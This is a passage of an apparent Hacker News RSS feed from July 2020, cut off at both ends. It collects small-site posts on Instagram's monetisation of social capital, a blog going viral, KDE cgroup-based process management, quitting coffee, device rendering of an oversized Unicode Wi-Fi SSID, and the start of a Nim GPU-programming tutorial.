<p><strong>Motivation</strong></p>



<p><strong>In gaming –</strong>&nbsp; the player must be intrinsically motivated to complete the task</p>



<p><strong>In social media: </strong>Where flow theory in gaming requires a complete blueprint of gamification to tap into the intrinsic motivation of players, socialising is a natural state of flow humans have always engaged in. The activity of building social capital is, for the most part, natural and instinctive especially when paired with the platform’s circular feedback loop for validation and reward.</p>



<h3>Making decisions and maintaining flow: the final stages</h3>



<p>Given that social media by its very nature can keep participants engaged without too much intervention, the most important element of gamification becomes the conversion of social capital into economic value. This has to be achieved without drowning the platform in mechanisms which disturb the state of flow already established.&nbsp;&nbsp;</p>



<p>The original set of features introduced by the platform for the accumulation of social capital has a shelf life, after which users will tire of it or reach a point of saturation that skews the effort to return balance necessary for flow. At this point platforms need to extend the avenues of creation, either by innovating existing features or introducing new features. This is the kind of thinking that drives Instagram to introduce ‘stories’ as opposed to just static posts for the feed.</p>



<p>However as the features start compounding, there is an inevitable layering of game theory mechanics which could heavily influence the state of flow. For this reason, the introduction of new features has to avoid detracting from the existing balance of social capital accumulation. If a feature presented a challenge greater than the effort or skill the user was willing to part with – participation and therefore total social capital on the platform would take a hit.&nbsp;&nbsp;&nbsp;</p>



<p>In a similar sense, the introduction of the Instagram Checkout was a thoughtful and timely implementation over many years of incremental introductions that maintained the state of flow for users. Instagram prioritised the maintenance of social capital within its ecosystem, choosing not to risk the pre-emptive roll out of a feature that would deplete social capital or endanger the state of flow it was cultivating.&nbsp;&nbsp;</p>



<p>When users began tapping into off-platform mechanisms to convert their social capital into economic capital as a result of this, Instagram didn’t put up any barriers. Instagram would have seen this as priming its users for a later stage of its own conversion funnel without taking on any of the risk of disturbing its own state of flow. In 2016, when Instagram introduced Shopping tags for feed posts and later the Shopping tab in 2018, features that led to external stores for point of purchase, it was encouraging this behaviour – all the while knowing it would eventually incorporate these tested habits back into its own environment.&nbsp;</p>



<h3>Social to economic capital: a delicate conversion</h3>



<p>Given that maintaining a state of flow is a key decision metric behind the strategies of killer platforms, a nuanced understanding of it better places us to predict how other platforms like Whatsapp and Twitter may navigate this delicate balance moving forward.&nbsp;</p>



<p>With 89% of influencers using Instagram, it ranks as the number one platform for influencer marketing – no better testament to the economic rewards Instagram will reap as it begins cashing in its unparalleled social capital. Whilst we do not have many points of comparison for social media platforms at the scale of Instagram, the social capital it has been able to accrue is an undeniably powerful metric. Instagram in 2019 brought in 20 billion USD in revenue which accounts for more than a quarter of Facebook’s revenue in that year, only projected to grow further from there.&nbsp;</p>



<p>The careful transition of Instagram towards the full conversion funnel ensures its now end to end e-commerce experience is revered as a perfectly convenient segway for users as opposed to an uncomfortable push for higher revenues.&nbsp;</p>



<div id="slimcalltoaction"><p>This is box title</p><p>If you enjoyed this article, take advantage of our 14 days free trial to explore our exclusive content. View our subscription options <a href="https://4thquadrant.io/subscribe">here.</a></p></div>





<p>
<h3><span>Down the Rabbit Hole</span></h3>
</p>



<h3>1. Reverse network effects and the conundrum of maintaining palatable signal to noise ratios</h3>



<p>Network effects have seen social networks grow to valuations of billions and connect millions of users. It is tempting to believe that these platforms will remain fail-proof in perpetuity. The value created in a network relies on ‘connection, content and clout’.</p>



<p>“Across these three drivers, a network with greater scale provides greater value in the form of:</p>



<ol><li>More prospective connections for the user</li><li>A larger corpus of potentially relevant content</li><li>Access to a larger base of potential followers (greater clout), for …</li></ol></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://4thquadrant.io/articles/mental-models/rich-app-poor-app-social-capital-as-currency/">https://4thquadrant.io/articles/mental-models/rich-app-poor-app-social-capital-as-currency/</a></em></p>]]>
            </description>
            <link>https://4thquadrant.io/articles/mental-models/rich-app-poor-app-social-capital-as-currency/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23708585</guid>
            <pubDate>Thu, 02 Jul 2020 00:33:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I Went Viral on Hacker News – Here is what happened]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=23708394">thread link</a>) | @remotists
<br/>
July 1, 2020 | https://www.shivaprabhakaran.com/post/went-viral-on-hacker-news | <a href="https://web.archive.org/web/*/https://www.shivaprabhakaran.com/post/went-viral-on-hacker-news">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="7.10.5"><div dir="ltr"><div><p id="viewer-foo">Yesterday at around 18:00, I started writing a post on my new Substack newsletter around mental models &amp; decision making. Little did I know that this post will go on to feature on the front page of Hacker News. </p><div id="viewer-d2uba"><div><div data-hook="imageViewer"><div role="img"><p><img data-pin-url="https://www.shivaprabhakaran.com/post/went-viral-on-hacker-news" data-pin-media="https://static.wixstatic.com/media/4a0eb5_6e27eaddd0f645a69d779893476f53b1~mv2.png/v1/fit/w_488,h_42,al_c,q_80/file.png" src="https://static.wixstatic.com/media/4a0eb5_6e27eaddd0f645a69d779893476f53b1~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p><svg viewBox="0 0 19 19"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 01-.283 0l-.374-.374a.2.2 0 010-.283l4.356-4.355h-3.786a.2.2 0 01-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 01-.2.2h-.529a.2.2 0 01-.2-.2zm-6.5 6.9v.529a.2.2 0 01-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 01.283 0l.374.374a.2.2 0 010 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z"></path></svg></div></div></div></div><p id="viewer-6a974">When I woke up today, I checked my Substack and this is what I found.</p><div id="viewer-dh0j"><div><div data-hook="imageViewer"><div role="img"><p><img data-pin-url="https://www.shivaprabhakaran.com/post/went-viral-on-hacker-news" data-pin-media="https://static.wixstatic.com/media/4a0eb5_518d658332ea46c8a71153d485e49ad4~mv2.png/v1/fit/w_867,h_566,al_c,q_80/file.png" src="https://static.wixstatic.com/media/4a0eb5_518d658332ea46c8a71153d485e49ad4~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p><svg viewBox="0 0 19 19"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 01-.283 0l-.374-.374a.2.2 0 010-.283l4.356-4.355h-3.786a.2.2 0 01-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 01-.2.2h-.529a.2.2 0 01-.2-.2zm-6.5 6.9v.529a.2.2 0 01-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 01.283 0l.374.374a.2.2 0 010 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z"></path></svg></div></div></div></div><p id="viewer-cmeq6">While it is great that I got a lot of traffic from Hacker News, I didn't get a lot of subscribers primarily because I didn't add a subscribe button on the post. I gained just 53 and I have since then added the button to the post.</p><div id="viewer-89lvi"><div><div data-hook="imageViewer"><div role="img"><p><img data-pin-url="https://www.shivaprabhakaran.com/post/went-viral-on-hacker-news" data-pin-media="https://static.wixstatic.com/media/4a0eb5_2a066eb3044f40b2819008945d7b9013~mv2.png/v1/fit/w_795,h_699,al_c,q_80/file.png" src="https://static.wixstatic.com/media/4a0eb5_2a066eb3044f40b2819008945d7b9013~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p><svg viewBox="0 0 19 19"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 01-.283 0l-.374-.374a.2.2 0 010-.283l4.356-4.355h-3.786a.2.2 0 01-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 01-.2.2h-.529a.2.2 0 01-.2-.2zm-6.5 6.9v.529a.2.2 0 01-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 01.283 0l.374.374a.2.2 0 010 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z"></path></svg></div></div></div></div><p id="viewer-57fh3">I also noticed that there is a discrepancy between data from Google Analytics and Substack's native analytics. While Substack shows the traffic to be around 20k, GA on the other hand shows only 10k.</p><div id="viewer-euios"><div><div data-hook="imageViewer"><div role="img"><p><img data-pin-url="https://www.shivaprabhakaran.com/post/went-viral-on-hacker-news" data-pin-media="https://static.wixstatic.com/media/4a0eb5_98ea421214a44d0881fc294f95050d70~mv2.png/v1/fit/w_1142,h_646,al_c,q_80/file.png" src="https://static.wixstatic.com/media/4a0eb5_98ea421214a44d0881fc294f95050d70~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p><svg viewBox="0 0 19 19"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 01-.283 0l-.374-.374a.2.2 0 010-.283l4.356-4.355h-3.786a.2.2 0 01-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 01-.2.2h-.529a.2.2 0 01-.2-.2zm-6.5 6.9v.529a.2.2 0 01-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 01.283 0l.374.374a.2.2 0 010 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z"></path></svg></div></div></div></div><p id="viewer-91ono">Here is a further break down with the source/medium which shows that majority of the traffic was from Hacker News followed by Twitter, Indie Hackers and Reddit.</p><div id="viewer-31i0"><div><div data-hook="imageViewer"><div role="img"><p><img data-pin-url="https://www.shivaprabhakaran.com/post/went-viral-on-hacker-news" data-pin-media="https://static.wixstatic.com/media/4a0eb5_af728d07a45a42198ce909e127ba3e43~mv2.png/v1/fit/w_1115,h_527,al_c,q_80/file.png" src="https://static.wixstatic.com/media/4a0eb5_af728d07a45a42198ce909e127ba3e43~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p><svg viewBox="0 0 19 19"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 01-.283 0l-.374-.374a.2.2 0 010-.283l4.356-4.355h-3.786a.2.2 0 01-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 01-.2.2h-.529a.2.2 0 01-.2-.2zm-6.5 6.9v.529a.2.2 0 01-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 01.283 0l.374.374a.2.2 0 010 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z"></path></svg></div></div></div></div><p id="viewer-elfoi">While I am happy that this went viral, there are a few things that I wish I had done. </p><ol><li id="viewer-8kssf"><p>Add a subscribe button in the post. </p></li><li id="viewer-7d7o9"><p>Add a sponsor/affiliate link in the post</p></li><li id="viewer-5l8vh"><p>Structure the post a little better.</p></li><li id="viewer-el4ov"><p>Respond to comments on HN to drive engagement.</p></li></ol><p id="viewer-4bovn">Here is the original post: <a href="https://models.substack.com/p/circle-of-competence-avoid-ambiguity" target="_blank" rel="noopener">https://models.substack.com/p/circle-of-competence-avoid-ambiguity</a></p><p id="viewer-4ftbm">If you like that post, consider subscribing. I'll answer any questions you may have in the comments. </p></div></div></div></div></article></div></div>]]>
            </description>
            <link>https://www.shivaprabhakaran.com/post/went-viral-on-hacker-news</link>
            <guid isPermaLink="false">hacker-news-small-sites-23708394</guid>
            <pubDate>Thu, 02 Jul 2020 00:10:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bringing modern process management to the desktop]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23708317">thread link</a>) | @todsacerdoti
<br/>
July 1, 2020 | http://blog.davidedmundson.co.uk/blog/modern-process-management-on-the-desktop/ | <a href="https://web.archive.org/web/*/http://blog.davidedmundson.co.uk/blog/modern-process-management-on-the-desktop/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-240">
	
	<!-- .entry-header -->

	<div>
		<p>A desktop environment's sole role is to connect users to their applications. This includes everything from launching apps to actually displaying apps but also managing them and making sure they run fairly. Everyone is familiar the concept of a "Task manager" (like ksysguard), but over time they haven't kept up with the way applications are being developed or the latest developments from Linux.</p>

<h2>Managing running processes</h2>
<p>There used to be a time where one PID == one "application". The kwrite process represents Kwrite, the firefox process represents Firefox, easy. but this has changed. To pick an extreme example:<br>
<strong>Discord in a flatpak is 13 processes!</strong></p>
<p>It basically renders our task manager's process view unusable. All the names are random gibberish, trying to kill the application or setting nice levels becomes a guessing game.  Parent trees can help, but they only get you so far.</p>
<p>It's unusable for me, it's probably unusable for any user and gets in the way of feeling in control of your computer.</p>
<p>We need some metadata.</p>
<h2>Fair resource distribution</h2>
<p>As mentioned above discord in a flatpak is 13 processes. Krita is one process.</p>
<ul>
<li>One will be straining the CPU because it is a highly sophisticated application doing highly complicated graphic operations</li>
<li>One will be straining the CPU because it's written in electron</li>
</ul>
<p>To a kernel scheduler all it would see are 14 opaque processes. It has no knowledge that they are grouped as two different things. It won't be able to come up with something that's fair.</p>
<p>We need some metadata.</p>
<p>(caveat: Obviously most proceses are idling, and I've ignored threads for the purposes of making a point, don't write about it)</p>
<h2>It's hard to map things</h2>
<p>Currently the only metadata of the "application" is on a window.  To show a user friendly name and icon in ksysguard (or any other system monitor) we have to fetch a list of all processes, fetch a list of all windows and perform a mashup. Coming up with arbitrary heuristics for handling parent PIDs which is unstable and messy.</p>
<p>To give some different real world examples:</p>
<ul>
<li>In plasma's task manager we show an audio indicator next to the relevant window, we do this by matching PIDs of what's playing audio to the PID of a window. Easy for the simple case... however as soon as we go multi-process we have to track the parent PID, and each "fix" just alternates between one bug and another.</li>
<li>With PID namespaces apps can't correctly report client PIDs anymore.</li>
<li>We lose information on what "app" we've spawned. We have bug reports where people have two different taskmanager entries for "Firefox" and "Firefox (nightly)" however once the process is spawned that information is lost - the application reports itself as one consistent name and our taskbar gets confused.</li>
</ul>
<p>We need some metadata.</p>

<h2>This is a solved problem!</h2>
<p>A modern sysadmin doesn't deal in processes, but cgroups. The cgroup manager (which will be typically systemd) spawns each service as one cgroup. It uses cgroups to know what's running, the kernel can see what things belong together. </p>
<p>On the desktop flatpaks will spawn themselves in cgroups so that they can use the relevant namespace features.</p>
<p>You're probably already using cgroups. As part of a <a href="https://systemd.io/DESKTOP_ENVIRONMENTS">cross-desktop effort</a> we want to bring cgroups to the entire desktop.</p>
<h2>Example</h2>
<p>Before and after of our system monitor<br>
<a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/old1.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/old1.png" alt=""></a></p>
<p><a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/ksysguardqml_apps.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/ksysguardqml_apps-1024x772.png" alt=""></a></p>
<p>Ultimately the same data but way easier to read..</p>

<p>Another key part of cgroup usage is the concept of slices. Cgroups are based on a heirachical structure, with slices as logical places to split resource usage. We don't adjust resources globally, we adjust resources within our slice, which then provides information to the scheduler.</p>
<p><a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/treepie.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/treepie.png" alt=""></a></p>
<p>Conceptually you can imagine that we just adjust resources within our level of a tree. Then the kernel magically takes care of the rest.</p>
<p>More information can be found on slices in this excellent series <a href="https://www.redhat.com/en/blog/world-domination-cgroups-part-2-turning-knobs"> World domination with cgroups</a>.</p>
<h2>Default slices</h2>
<p>This means we can set up some predefined slices. Within the relevant user slice this will consist shared of</p>
<ul>
<li>applications</li>
<li>the system (kwin/mutter, plasmashell)</li>
<li>background services (baloo, tracker)</li>
</ul>
<p>Each of these slices can be given some default prioritisations and OOM settings out of the box.</p>
<h2>Dynamic resource shifting</h2>
<p>Now that we are using slices, and only adjusting our relative weight within the slice, we can shift resource priority to the application owning the focused window.</p>
<p>This only has any effect if your system is running at full steam from mulitple sources at once, but it can provide a slicker response at no drawback.</p>
<h2>Why slice, doesn't nice suffice?</h2>
<p>Nice is a single value, global across the entire system. Because of this user processes can only be lowered, but never raised to avoid messing with the system.  With slices we're only adjusting relative weight compared to services within our slice. So it's safe to give the user full control within their slice. Any adjustments to an application, won't impact system services or other users.</p>
<p>It also doesn't conflict with nice values set by the application explicitly. If we set kdevelop to have greater CPU weight, clang won't suddenly take over the whole computer when compiling.</p>

<h2>CGroup extra features</h2>
<p>CGroup's come with a lot of new features that aren't available on a per-process level. </p>
<p>We can:</p>
<ul>
<li>Set limits so that a CPU can't use more than N% </li>
<li>We can gracefully close processes on logout</li>
<li>We can disable networking</li>
<li>We can set memory limits</li>
<li>We can prevent forkbombs</li>
<li>We can provide hints to the OOM killer not just with a weight but with expected ranges that should be considered normal</li>
<li>We can freeze groups of processes (which will be useful for Plasma mobile)<br>
... </li>
</ul>
<p>All of this is easy to add for a user / system administrator. Using drop in's one can just add a .service file [example file link] to ~/.config/systemd/user.control/app-firefox@.service and manipulate any of these.</p>
<p>[caveat, some of those features works for applications created as new transient services, not the lite version using scopes that's currently merged in KDE/Gnome - maybe worth mentioning]</p>

<p>Plasma 5.19 and recent Gnome now spawn applications into respective cgroups, but we're not yet surfacing the results that we can get from this.</p>
<p>For the KDE devs providing the metadata is easy.</p>
<p>If spawning a new application from an existing application be sure to use either <a href="https://api.kde.org/frameworks/kio/html/classKIO_1_1ApplicationLauncherJob.html"><code>ApplicationLauncherJob</code></a> or <a href="https://api.kde.org/frameworks/kio/html/classKIO_1_1CommandLauncherJob.html"><code>CommandLauncherJob</code></a> and set the respective service. Everything else is then handled automagically. You should be using these classes anyway for spawning new services.</p>
<p>For users, you can spawn an application with either <code><code>kstart5 --application foo.desktop"</code></code></p>
<p>That change to the launching is relatively tiny, but getting to this point in Plasma wasn't easy - there were a lot of edge cases that messed up the grouping correctly.</p>
<ul>
<li>kinit, our zygote process really meddled with keeping things grouped correctly</li>
<li>drkonqi, our crash handler and application restarter</li>
<li>dbus activation has no knowledge of the associated .desktop file if an application is DBus activated (such as spectacle our screenshot tool)</li>
<li>and many many more papercuts throughout of different launches</li>
</ul>
<p>Also to fully capitalise on slices we need to move all our background processes into managed services and slices. This is worthy of another (equally lengthy) blog post.</p>
<h2>How you can help?</h2>
<p>It's been a battle to find these edge cases.<br>
Whilst running your system, please run systemd-cgls and point out any applications (not background services yet) that are not in their appropriate cgroup.</p>

<p>(e.g BSD users)</p>
<p>As we're just adding metadata, everything used now will continue to work exactly as it does now. All existing tools work exactly the same. Within our task manager we still will keep a process view (it's still useful regardless) and we won't put in any code that relies on the cgroup metadata present. We'll keep the existing heuristics for matching windows with external events, cgroup metadata would just be a strongly influence factor in that. Things won't get worse, but we won't be able to capitalise on the new features discussed here, </p>
	</div><!-- .entry-content -->

	
	<!-- .entry-footer -->

</article></div>]]>
            </description>
            <link>http://blog.davidedmundson.co.uk/blog/modern-process-management-on-the-desktop/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23708317</guid>
            <pubDate>Wed, 01 Jul 2020 23:58:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[No More Coffee]]>
            </title>
            <description>
<![CDATA[
Score 48 | Comments 72 (<a href="https://news.ycombinator.com/item?id=23708204">thread link</a>) | @riverlong
<br/>
July 1, 2020 | https://jayriverlong.github.io/2020/06/30/coffee.html | <a href="https://web.archive.org/web/*/https://jayriverlong.github.io/2020/06/30/coffee.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main"> <article role="article">  <p>I never identified as a coffee snob or someone with a serious habit – like everyone else, I made lots of self-deprecating jokes about how much coffee I drank – until one day I realized that I had been drinking more coffee than anyone else I knew for the past fifteen years.</p> <p>I started drinking coffee in high school. I would stay up all night competitively playing video games, and then head to school on two or three hours of sleep. If I tried to attend class, I would immediately pass out on my desk. There was a coffee machine in the cafeteria, where I would solve that problem by purchasing a cup of scalding-hot black coffee for fifty cents. It was shitty coffee, and I hated the flavor. But I needed it, and took the bitterness as fair punishment for not sleeping. That cup got me wired – the caffeine rush would electrify my body, and my hand would shake erratic, two-inch tall letters out of my Pilot V5.</p> <p>Two hours later, I’d get another cup, and that would last me into the early afternoon. I’d crash and fall asleep in class at 1:50pm, like clockwork. I’d get another cup at 2:00pm between classes, to carry me through the rest of the day. When I took my finals before graduating, the principal sent out a grade-wide complaint that too many coffee cups got littered outside the exam rooms. They were all mine. My #1 concern in high school was dying of a heart attack due to my completely insane sleep and caffeine habits.</p> <p>Somehow I survived high school. My sleep patterns would, over the course of the years, very slowly approach those of a normal person, but coffee stuck. I would drink it to help stay up late, or to wake me up after a short night. When things got really urgent I’d supplement with some Red Bull. My tastes advanced a little bit: I quit the punitive straight black coffee, and experimented with extravagances like sugar and milk. As I started to work internships near Starbuckses, I would get vanilla-hazelnut lattes, and my coffee runs were known for their consistency and punctuality.</p> <p>After college and graduate school, things kicked up a notch. Lots of people define their persona by their love of coffee, and I chose to be one of those. I drank coffee – lattes, in particular – religiously. My first business card’s title read <em>Caffeine Fiend</em>.<sup id="fnref:1"><a href="#fn:1">1</a></sup> I systematically sampled nearly every single cafe in San Francisco. Weirdly, I knew I didn’t really love lattes. I liked them, but a latte can ultimately only be so good. They were a habit, something I’d been doing for a long time, and had made part of my persona.<sup id="fnref:2"><a href="#fn:2">2</a></sup> Besides, I needed the kick. I realized that coffee was useful in technical, creative work not because it increases wakefulness, but because it increases <em>focus</em>. I had a latte machine in the office and a company to build, so at some point I hit ten cups a day.</p> <p>Enter March 2020. I had moved offices – no more free coffee – and was spending more on cinnamon lattes than some people spend on their mortgage. I was more cautious than most about COVID-19, and started isolating myself in early March. Being a coffee addict but not a true aficionado, I did not own anything in the way of a coffee machine. (I have never made much use of my kitchen.) I had no way to make coffee at home, and due to COVID I wasn’t in the mood to go out shopping. Almost four months later, I still haven’t had any coffee.</p> <p>Losing coffee was unpleasant at first. Abandoning a ritual can make the rest of the day feel weirdly incomplete. But I soon stopped missing or thinking about it. My quality of life had improved. With coffee, the regular motions of the day become exaggerated – there would be spikes of focus and the feeling of productivity<sup id="fnref:3"><a href="#fn:3">3</a></sup>, but there would also be caffeine crashes every four hours. The days that I used caffeine to push myself too far would invariably end in long headaches. I often felt very seriously drained at the end of the workday, and couldn’t do anything in the evening.</p> <p>The last four months, without coffee, have been much better. No headaches. No crashes. Consequently – and ironically – I’m now probably <em>more awake</em> on average throughout the day. I’ve been very surprised by how little I actually needed the caffeine, even in the morning after a short night. Thus, I’m not sure how much value caffeine actually provided me over the past few working years. I had so much of it that the beneficial effects certainly wore off (I would even drink coffee right before going to sleep). However, the downsides of coffee – trading in later energy to have more focus now, the drain and crash later in the day – never wore off.</p> <p>Ultimately, as COVID wraps up and things go back to normal, I don’t feel the need to pick up coffee again. Maybe I’ll try decaf for the pleasure of an evening latte, but I’m happy to kick the habit.</p> <hr>  <br> </article> </div></div>]]>
            </description>
            <link>https://jayriverlong.github.io/2020/06/30/coffee.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23708204</guid>
            <pubDate>Wed, 01 Jul 2020 23:44:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Comparing how different devices display the SSID “á̶̛̛̓̿̈͐͆̐̇̒̑̈́͘͝aaa”]]>
            </title>
            <description>
<![CDATA[
Score 120 | Comments 24 (<a href="https://news.ycombinator.com/item?id=23708056">thread link</a>) | @herohamp
<br/>
July 1, 2020 | https://hamptonmoore.com/posts/weird-wifi-name-display/ | <a href="https://web.archive.org/web/*/https://hamptonmoore.com/posts/weird-wifi-name-display/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>   <p>After my recent post <a href="https://hamptonmoore.com/posts/fios-home-router-emoji/">Setting the SSID of a Fios Home Router to an emoji</a> I decided to set my WiFis SSID to “á̶̛̛̓̿̈͐͆̐̇̒̑̈́͘͝aaa”. That name is <a href="https://mothereff.in/byte-counter#a%CC%B6%CC%81%CC%93%CC%BF%CC%88%CC%9B%CC%9B%CD%90%CD%98%CD%86%CC%90%CD%9D%CC%87%CC%92%CC%91%CD%84aaa">36 octets</a> making it over the 32 octets maxium specified in the 2012 standard of 802.11 Section 6.3.11.2.2. My router just cut the name down to 32 octets though to stay complient. This was what was being sent according to <code>iw</code> <code>a\xcc\xb6\xcc\x81\xcc\x93\xcc\xbf\xcc\x88\xcc\x9b\xcc\x9b\xcd\x90\xcd\x98\xcd\x86\xcc\x90\xcd\x9d\xcc\x87\xcc\x92\xcc\x91\xcd</code> with the raw hex being <code>61ccb6cc81cc93ccbfcc88cc9bcc9bcd90cd98cd86cc90cd9dcc87cc92cc91cd</code>.</p> <p>I decided to see how this showed up on different devices and got some pretty strange results. Below are the devices tested sorted rougly to how they acted.</p> <p>Galaxy S8 running Android 9 with Kernel 4.4.153 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/android.jpg" alt=""></p> <p>Amazon Firestick <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/firestick.jpg" alt=""></p> <p>Both the s8 and the Firestick are rendering the result in what I deem as the correct way with it showing the name just with some of the vertical characters cutoff.</p> <p>iPhone running iOS 13.5.1 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/iphone-ios1351.jpg" alt=""></p> <p>Apple TV Second Generation <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/appletvgen2.jpg" alt=""></p> <p>Next comes the iPhone and Apple TV. At first I had no idea what they were rending these characters as. At first I thought it was just extended ascii but that third character, ∂, was not in extended ASCII. After asking around on the Apple discord server someone said it might be using the <a href="https://en.wikipedia.org/wiki/Mac_OS_Roman">Mac OS Roman</a> character set. It turns out it which is strange because iOS used UTF-8 internally and not Mac OS Roman as that was phased out with the release of Mac OS X.</p> <p>Speaking of Apple devices, there will not be any photos of MacOS though not from a lack of trying. I could not get either of my Macbook to acknowledge that this WiFi network existed. Neither the Wifi dropdown nor the airport commandline utility would show it.</p> <p>Windows 10 Pro 10.0.19041 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/windows10.png" alt=""></p> <p><del>Windows 10 is rendering it using what I believe to be the UTF-8 characters of each octet. This matches what the raw hex of the wifi name would become if you split it up into 8bit bytes and used that as UTF-8 chars.</del> It was pointed out by <a href="https://twitter.com/theFerdi265">@theFerdi265</a> that this is not the first set of UTF-8 chars like I thought. Instead it is <a href="https://en.wikipedia.org/wiki/Windows-1252">Windows-1252</a>, a single-byte character encoding of the Latin alphabet, used by default in the legacy components of Microsoft Windows for English and some other European languages.</p> <p>Chromebook running ChromeOS 83.0.4103.97 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/chromeos.jpg" alt=""></p> <p>ChromeOS is just freaking out not knowing how to render any of the charaters besides the singular a.</p> <p>Kindle Paperwhite running Firmware 5.10.2 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/kindlepaperwhite.jpg" alt=""></p> <p>Vizio M55-C2 TV <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/viziom55-c2.jpg" alt=""></p> <p>Both the Kindle and Vizio TV are showing what <code>iw</code> returned with the a and then escaped hexademical characters.</p> <p>I have no published a follow up to this post, <a href="https://hamptonmoore.com/posts/weird-wifi-names-cont/">here</a>.</p> <p>Discuss this post on Hacker News <a href="https://news.ycombinator.com/item?id=23708056">here</a></p> <hr> <p> Hello reader. I do not normally like to put advertisements or promotions on my website, but recently a good friend of my Jaden Ann Scrivener died in a car crash. She was known in the community as the most caring and energetic person around. She was a beam of sunshine and happiness brightening up the day of anyone who interacted with her. If you could <a href="https://www.aplos.com/aws/give/RayofHopeMedicalMissionsInc/Jaden">please donate to her memorial fund</a>. All the proceeds will go to the <a href="https://www.rohmm.org/">Ray of Hope Medical Missions</a> which facilitates life-changing surgeries, reduces infant mortality, and provides mission opportunities locally. </p> </article></div>]]>
            </description>
            <link>https://hamptonmoore.com/posts/weird-wifi-name-display/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23708056</guid>
            <pubDate>Wed, 01 Jul 2020 23:26:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Working with OpenCL and CUDA in Nim (2018)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23707978">thread link</a>) | @memexy
<br/>
July 1, 2020 | https://mratsim.github.io/Arraymancer/uth.opencl_cuda_nim.html | <a href="https://web.archive.org/web/*/https://mratsim.github.io/Arraymancer/uth.opencl_cuda_nim.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="documentId">
  <div>
    
    <p><em>Date: May 6, 2018, by Mamy André-Ratsimbazafy</em></p>
<p>Arraymancer is a tensor library I’m writing from the ground up in Nim. Cuda support was added in v0.3 last December, I just released the new v0.4 with OpenCL support.</p>
<p>I’d like to share a bit of my experience on working in OpenCL through Nim. First of all, you have to know that none of the big guys (Google Tensorflow, Facebook PyTorch, Apache/Amazon MxNet, Microsoft CNTK or even Intel/AMD) has first class OpenCL support.</p>
<p>Why? Probably because Nvidia is providing superb tools and documentation for frameworks developers. Also Cuda can leerage a few C++ facilities like generics and function objects that I use heavily for generic code.</p>
<p>For example in Nim+Cuda I define element-wise functions like the following and pass it to a higher-order function that will apply it element-wise on 3 tensors:</p>
<pre>

<span>template</span> <span>cuda_binary_op</span><span>(</span><span>op_name</span><span>,</span> <span>op_symbol</span><span>:</span> <span>string</span><span>)</span><span>=</span>
  <span>{</span><span>.</span><span>emit</span><span>:</span><span>[</span><span>"""
  template&lt;typename T&gt;
  struct """</span><span>,</span><span>op_name</span><span>,</span><span>"""{
